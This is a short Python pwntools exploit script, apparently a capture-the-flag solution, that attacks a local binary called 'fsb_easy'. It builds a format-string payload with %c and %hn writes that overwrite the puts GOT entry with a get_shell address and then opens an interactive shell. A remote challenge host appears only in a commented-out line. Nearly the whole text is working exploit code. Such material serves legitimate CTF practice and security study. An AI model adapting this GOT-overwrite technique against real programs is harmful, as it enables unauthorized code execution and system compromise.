#!/usr/bin/env python
# coding=utf-8
from pwn import *

p = process('fsb_easy')  #,env = {'LD_PRELOAD' : ',.libc.so.6'})
#libc = ELF('libc.so.6')
elf = ELF('fsb_easy')
#DEBUG = 1
#if DEBUG:
#    p = process('./fsb_easy')
#else:
#    p = remote("106.75.66.195",13002)

#if DEBUG: context(log_level='debug')
#context.log_level = 'debug'
#gdb.attach(p, 'b printf')
#gdb.attach(proc.pidof(p)[0])

puts_got = elf.got["puts"]
#puts_got = 0x601018
print hex(puts_got)
#pause()
get_shell = 0x4008c9

'''
 addr[0x601018] = 0x08c9
 addr[0x60101a] = 0x0040
 addr[0x60101c] = 0x0000
 addr[0x60101e] = 0x0000
 0x601018 => 0x004008c9
 
'''

def s_sub(a,b):
    if a<b:
       return 0x10000 + a - b 
    return a - b 


n = 6 + 8
pattern = "%{}c%{}$hn" 

payload = ""
payload += pattern.format(0x8c9,n)
payload += pattern.format(s_sub(0x40,0x8c9),n+1)
payload += pattern.format(s_sub(0,0x40),n+2)
#payload += pattern.format(s_sub(0,0),n+3)
payload = payload.ljust(64,"A")

payload += p64(0x601018)
payload += p64(0x60101a)
payload += p64(0x60101c)
#payload += p64(0x60101e)

pause()

p.sendline(payload)


p.interactive()
